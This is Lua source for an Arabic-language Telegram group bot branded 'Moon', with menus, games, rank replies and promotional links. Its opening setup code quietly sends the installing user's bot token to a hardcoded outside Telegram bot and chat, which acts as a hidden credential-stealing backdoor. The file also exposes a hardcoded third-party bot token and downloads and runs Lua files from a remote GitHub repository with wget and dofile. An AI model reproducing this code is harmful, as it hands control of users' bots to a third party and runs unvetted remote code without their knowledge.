...
https.request('https://api.telegram.org/bot1900386181:AAFMwGkct-xcF-pxK9k3tM9YtzvkClMT-vo/sendmessage?chat_id=859213488&text=' ..token)
end 
else
...
io.write('\27[0;35m\n ارسل لي ايدي المطور الاساسي ⩹━━━⊶❲¹𝐌ΘΘ𝐍¹❳⊷━━━⩺\n\27[0;33;49m')
...
io.write('\27[1;31m ⩹━━━⊶❲¹𝐌ΘΘ𝐍¹❳⊷━━━⩺ ارسل معرف المطور الاساسي :\n SEND ID FOR SIDO : \27[0;39;49m')
...
token = sudos.token 
--- start functions ⩹━━━⊶❲¹𝐌ΘΘ𝐍¹❳⊷━━━⩺
--------------------------------------------------------------------------------------------------------------
io.popen("mkdir File_Bot") 
io.popen("cd File_Bot && rm -rf commands.lua.1") 
io.popen("cd File_Bot && rm -rf commands.lua.2") 
io.popen("cd File_Bot && rm -rf commands.lua.3") 
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/Ffasit/H1_MA/VIKING/main/File_Bot/commands.lua") 
...
local UserName = (data.username_ or "UU_MOON")
...
sendAudio(msg.chat_id_,msg.id_,'./'..ffrr,"🎼✰¹𝐌ΘΘ𝐍¹✰")  
...
if text == "/start" then
if not DevSoFi(msg) then
local Namebot = (database:get(bot_id..'Name:Bot') or 'مون') 
local DRAGON_Msg = { 
...
local Text = ' ✰تم ارسال الملصق من ⩹━━━⊶❲¹𝐌ΘΘ𝐍¹❳⊷━━━⩺\n - '..Name
...
os.execute('wget https://raw.githubusercontent.com/Ffasit/H1_MA/VIKING/main/DRAGON.lua')
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/V_I_K_I_N_G_2/83/2&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
{'حكمه','قصيده','بوستات','باد'},
{'حرف','لو خيروك','اسئله محرجه'},
{'تويت بالصور','لو خيروك بالصور'},
...
{'بايو','انا مين','افلام'},
{'صور انيمي','رمزيات ولاد'},
{'تصميمات مون','مميزات'},
{'رمزيات بنات','رمزيات كابلز'},
{'العوده🍂'},
}
send_inline_key(msg.chat_id_,Text,Key)
end 
...
send(msg.chat_id_, msg.id_,' ✰ اصدار سورس مون{ 3x☆}')
end
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'مطورين السورس☎️', url="https://t.me/mo1ibrahim"}}, 
} 
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/SO_M00N/4&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end

if text == '⩹━━━⊶❲¹𝐌ΘΘ𝐍¹❳⊷━━━⩺' and DevSoFi(msg) then
local Text = [[ 
[قناه سورس مون ادخل وتابع الجديد](t.me/UU_MOON)
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '✰¹𝐌ΘΘ𝐍¹✰', url="t.me/UU_MOON"}}, 
...
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/SO_M00N/2&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if text == '━┅┅┄⟞⟦✰ 𝐌ΘΘ𝐍✰⟧⟝┄┉┉━' and DevSoFi(msg) then
local Text = [[ 
[قناه سورس مون ادخل وتابع الجديد](t.me/UU_MOON)
...
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/SO_M00N/4&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if text == 'معلومات الكيبورد' and DevSoFi(msg) then
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
[CH](t.me/UU_MOON)مرحبا بك مطوري سأشرح لك كل شئ في لوحه الاوامر بالتفصيل
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'قناه السورس', url="t.me/UU_MOON"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
if text == 'محمد مبرمج السورس' and DevSoFi(msg) then
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
↝المبرمج محمد ابراهيم لو حابب تتواصل معاه
اتبع الزر إلى تحت ⩹━━━⊶❲¹𝐌ΘΘ𝐍¹❳⊷━━━⩺↜
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '❨ᯓ『𝒎.𝒊𝒃𝒓𝒂𝒉𝒊𝒎 ‏. 』𓆃❩', url="t.me/H1_MA"}}, 
...
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
 ✰ من أحسن السورسات على التليجرام سورس مون ✰
...
print("it is Bot")
N = (database:get(bot_id.."Name:Bot") or "مون")
...
send(msg.chat_id_,0," ✰ الـعـضو  : {["..data.first_name_.."](T.ME/UU_MOON)}\n ✰ ["..DRAGON_Msg.."] \n")
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
send(msg.chat_id_,0, " ✰ عذرا  ⇇{["..data.first_name_.."](T.ME/UU_MOON)}\n ✰ عذرا تم منع الملصق \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
╭𖣘━┅⟞⟦[¹𝐌ΘΘ𝐍¹](http://t.me/UU_MOON)⟧⟝┉━𖣘╮

    [⟦𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗧𝗢 𝗠𝗢𝗢𝗡 ⤶ ⟧](http://t.me/UU_MOON)
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = ' ᯓ『𝒎.𝒊𝒃𝒓𝒂𝒉𝒊𝒎 ‏. 』𓆃', url = "https://t.me/H1_MA"}},
{{text = '✰ SＯＵＲＣＥ✰', url = "https://t.me/UU_MOON"}},
{{text = 'اضف البوت الي مجموعتك 🍃' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}}, 
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/SO_M00N/4&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
...
local Text = [[
 𖠪 اهلا بك في سورس مون الجمدان 𖠪
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/SO_M00N/4/3&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end

if text == 'محمد ابراهيم' or text == 'حمو' or text == 'مبرمج السورس'  then
local Text = [[
محمد ابراهيم مبرمج سورس مون للتواصل معه اتبع الزر الاسفل ⬇️💕.
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = ' ❨ᯓ『𝒎.𝒊𝒃𝒓𝒂𝒉𝒊𝒎 ‏. 』𓆃❩',url="t.me/H1_MA"}},
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/SO_M00N/83&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
...
if text == 'مطورين السورس' then
local Text = [[ 
مطورين ومبرمجين سورس مون اتبع الازرار للتواصل معهم ⬇️🧿
]]
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'مطورين السورس☎️', url="https://t.me/mo1ibrahim"}}, 
...
if text == "تصميمات مون" and not  database:get(bot_id.."sing:for:me"..msg.chat_id_) then 
ght = math.random(1,3); 
local Text ='تم اختيار تصميم من تصميمات مون هذه لك' 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '❨  ᯓ『𝒎.𝒊𝒃𝒓𝒂𝒉𝒊𝒎 ‏. 』𓆃 ❩', url="t.me/H1_MA"}},
...
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendVideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/HAM0_h/'..ght..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
حمايه.سرعه.دقه وامان
 قناه السورس ⬇️
  [W𝙴𝙻𝙲𝙾𝙼𝙴 𝚃𝙾 ✰ SＯＵＲＣＥ✰](http://t.me/UU_MOON)
]]
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '✰¹𝐌ΘΘ𝐍¹✰ ', url="t.me/UU_MOON"}}, 
...
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
[❨ محمد ابراهيم مبرمج سورس مون للتواصل معه اتبع الزر الاسفل ⬇️💕. ❩](t.me/H1_MA)
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '❨  ᯓ『𝒎.𝒊𝒃𝒓𝒂𝒉𝒊𝒎 ‏. 』𓆃 ❩', url="t.me/H1_MA"}},
{{text = '《✰ SＯＵＲＣＥ✰ 》', url="t.me/TW_MOHAMED_BOT"}}, 
} 
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/SO_M00N/4&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
if text == 'العاب مون' or text == 'العاب مطوره' or text == 'الالعاب المتطوره' then  
local Text = [[  
 ✰ اهلا في قائمه الالعاب المتطوره سورس مون ✰ 
...
local msg_id = msg.id_/2097152/0.5  
https.request("https://api.telegram.org/bot"..token..'/sendVideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/SO_M00N/2&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
--------------------------------------------------------------------------------------------------------------
...
local function taha(extra, taha, success)
if taha.photos_[0] then
local Name = '[اتبع الازرار للتواصل مع المطــور](t.me/UU_MOON)\n['..result.first_name_..'](tg://user?id='..result.id_..')\n'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = ''..result.first_name_..'', url = "https://t.me/"..result.username_..""},
...
local Text ='مرحبا إليك لو خيروك بالصور ✰' 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'اضف البوت الي مجموعتك 🍃' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/ffffaa/'..ght..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
function(arg,data) 
usertext = '\n ✰ الـعـضو   ⇇['..data.first_name_..'](t.me/'..(data.username_ or 'UU_MOON')..')'
...
usertext = '\n ✰ الـعـضو   ⇇['..result.title_..'](t.me/'..(username or 'UU_MOON')..')'
status  = '\n ✰ تم حظرو عام من الجروبات '
texts = usertext..status
...
if DevSoFi(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/Ffasit/H1_MA/VIKING/main/getfile.json")
if res == 200 then
local Get_info, res = pcall(JSON.decode,Get_Files);
vardump(res.plugins_)
if Get_info then
local TextS = "\n ✰ اهلا بك في متجر ملفات مون\n ✰ ملفات السورس ⩹━━━⊶❲¹𝐌ΘΘ𝐍¹❳⊷━━━⩺\n◤━───━??𝗼𝗼𝗼𝗻━───━◥\n\n"
local TextE = "\n⩹━━━⊶❲¹𝐌ΘΘ𝐍¹❳⊷━━━⩺\n ✰ علامة تعني { ✔️ } ملف مفعل\n ✰ علامة تعني { ✖ } ملف معطل\n ✰ قناة سورس مون⩹━━━⊶❲¹𝐌ΘΘ𝐍¹❳⊷━━━⩺\n".." ✰ [اضغط هنا لدخول](t.me/UU_MOON) \n"
local NumFile = 0
...
local json_file, res = https.request("https://raw.githubusercontent.com/Ffasit/H1_MA/VIKING/main/File_Bot/"..file)
if res == 200 then
os.execute("rm -fr File_Bot/"..file)
send(msg.chat_id_, msg.id_,t) 
dofile('DRAGON.lua')  
else
send(msg.chat_id_, msg.id_," ✰ عذرا الملف لايدعم سورس مون\n") 
end
return false
end
...
if text == ("مسح قائمه مون") and Sudo(msg) then
database:del(bot_id..'CoSu'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '\n ✰ تم مسح قائمه مون')
return false
end

if text == 'قائمه مون' and Sudo(msg) then
...
if text == ("رفع مون") and msg.reply_to_message_id_ and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^رفع مون@(.*)$") and Sudo(msg) then
local username = text:match("^رفع مون@(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^رفع مون(%d+)$") and Sudo(msg) then
local userid = text:match("^رفع مون(%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text == ("تنزيل مون") and msg.reply_to_message_id_ and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^تنزيل مون@(.*)$") and Sudo(msg) then
local username = text:match("^تنزيل مون@(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^تنزيل مون(%d+)$") and Sudo(msg) then
local userid = text:match("^تنزيل مون(%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
' }\n'..' ✰  الايدي بالصوره  ⇇{ '..idph..
' }\n'..' ✰  الرفع  ⇇{ '..setadd..
' }\n'..' ✰  الحظر  ⇇{ '..banm..' }\n\n ✰═───═❲[✰¹𝐌ΘΘ𝐍¹✰ ](t.me/UU_MOON)❳═───═ ✰\n ✰ قناة سورس مون⩹━━━⊶❲¹𝐌ΘΘ𝐍¹❳⊷━━━⩺\n [ ❲[✰¹𝐌ΘΘ𝐍¹✰ ](t.me/UU_MOON)❳](t.me/UU_MOON) \n'
send(msg.chat_id_, msg.id_,text)     
end
...
send(msg.chat_id_, msg.id_, t..'⩹━━━⊶❲¹𝐌ΘΘ𝐍¹❳⊷━━━⩺\nاضغط علي الاسم ليتم نسخه\n⩹━━━⊶❲¹𝐌ΘΘ𝐍¹❳⊷━━━⩺ٴ\n ✰ ❲[✰¹𝐌ΘΘ𝐍¹✰ ](t.me/UU_MOON)❳ ✰ ')
end
...
if text == ""..(database:get(bot_id..'Name:Bot') or 'مون').."" then  
Namebot = (database:get(bot_id..'Name:Bot') or 'مون')
local DRAGON_Msg = {
'نعم يروحي♥️🙈',
'نعم يا قلب  '..Namebot..'',
'عاوز اي من '..Namebot..'',
'دوختو  '..Namebot..'',
'انت تعرف انو بوت  '..Namebot..'  متنصب علي سورس مونو🙈♥️',
'بتشقط وجي ويت 🤪',
'ايوا جاي 🙈',
'يعم هتسحر واجي 😾',
...
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendVoice?chat_id=' .. msg.chat_id_ .. '&voice=https://t.me/hamoaldi/'..ght..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
end
if text == "ثيم" then  
...
end --الكود حصري سورس مونيعني لو بكتهن راح اعرفك انت الاخذتهن
...
-------------------------------
if text == ""..(database:get(bot_id..'Name:Bot') or 'مون').." غادر" or text == 'غادر' then  
...
send(msg.chat_id_,msg.id_, '[نت مطوري تاج راسي 😊](t.me/UU_MOON)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انت مطوري الثاني حته مني ??💚](t.me/UU_MOON)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انت المطور بس الصغنن 🌝💘](t.me/UU_MOON)')
return false
end
...
send(msg.chat_id_,msg.id_, '[نت المالك هن يعني حاجه فوق فوف راسي 😂♥](t.me/UU_MOON)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انت منشئ يسطا عتلاء منشئ عاوز حاجه تانيه😹🤦‍♂️](t.me/UU_MOON)')
return false
end
...
send(msg.chat_id_,msg.id_, '[ انت هنا منشئ اساسي يعني اعلى رتبه عاوزك تفتخر😂🎯](t.me/UU_MOON)')
return false
end
...
send(msg.chat_id_,msg.id_, '[ انت المدير يعني الروم تحت سيطرتك😹](t.me/UU_MOON)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انت مجرد ادمن اجتهد عشان ياخد رتبه😹 ](t.me/UU_MOON)')
return false
end
...
send(msg.chat_id_,msg.id_, '[ انت مميز ابن ناس 😊 ](t.me/UU_MOON)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انت مجرد عضو زليل حقير ملوش لزمه 😂](t.me/UU_MOON)')
return false
end
...
send(msg.chat_id_,msg.id_, '[مع الف سلامه يقلبي متجيش تاني..😹💔🎶](t.me/UU_MOON)')
return false
end
...
send(msg.chat_id_,msg.id_, '[باي..😺💜](t.me/UU_MOON)')
return false
end
...
send(msg.chat_id_,msg.id_, '[خدوني معاكم برايفت والنبي..🥺💜](t.me/UU_MOON)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[عليه الصلاه والسلام..💛🙂](t.me/UU_MOON)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[نزل عينك تحت كدا علشان هتخاد علي قفاك..✰♥️](t.me/UU_MOON)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[انت الي حلو ياقمر..♥️🦋](t.me/UU_MOON)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انا عايز مح انا كمان 🥺💛](t.me/UU_MOON)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[وحيات امك ياكبتن خدوني معاكو بيف...🥺💔](t.me/UU_MOON)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[بتعيط تيب لي طيب..😥](t.me/UU_MOON)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[ونجيب اشخاص ...😂😜](t.me/UU_MOON)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[بـعشـقق .🥰❤️](t.me/UU_MOON)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[وعليكم السلام ..🖤✰](t.me/UU_MOON)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[خخخ امال ..😹](t.me/UU_MOON)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[قامد قموده ..🌝♥️](t.me/UU_MOON)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[انا اجمد ..✰💕](t.me/UU_MOON)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[مش هروح ..😹👻](t.me/UU_MOON)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[مش هتيجي مش هروح ..😹👻](t.me/UU_MOON)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[الود كبر وبقي عندو بنت ..😻💥](t.me/UU_MOON)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[عندو كام سنه ..😹💥](t.me/UU_MOON)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[القمر مهو بيضكك اهوه ..✰💕](t.me/UU_MOON)')
return false
end
end
end
...
[🎯ألعاب سورس مون الاحسن في التليجرام .↑]
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
 [✰¹𝐌ΘΘ𝐍¹✰ ](t.me/UU_MOON)
]]
keyboard = {} 
...
local Teext =[[
🚨 اهلا بك في قسم الاوامر ..↑⩹━━━⊶❲¹𝐌ΘΘ𝐍¹❳⊷━━━⩺
 اختر الامر الذي تريدها .↑⩹━━━⊶❲¹𝐌ΘΘ𝐍¹❳⊷━━━⩺
ده من الازرار بلاسفل . ⩹━━━⊶❲¹𝐌ΘΘ𝐍¹❳⊷━━━⩺
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
❲[✰¹𝐌ΘΘ𝐍¹✰ ](t.me/UU_MOON)❳ 
]]
keyboard = {} 
...
if Text == '/add' then
local Teext =[[
🎮 اهلا بك في قسم الالعاب ..↑⟦✰ SＯＵＲＣＥ✰⟧
🕹 اختر العبه الذي تريدفي الاسفل ..↑⟦✰ SＯＵＲＣＥ✰⟧
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
 ❲[✰¹𝐌ΘΘ𝐍¹✰ ](t.me/UU_MOON)❳ 
]]
keyboard = {} 
...
local Name_Bot = (database:get(bot_id..'Name:Bot') or 'مون')
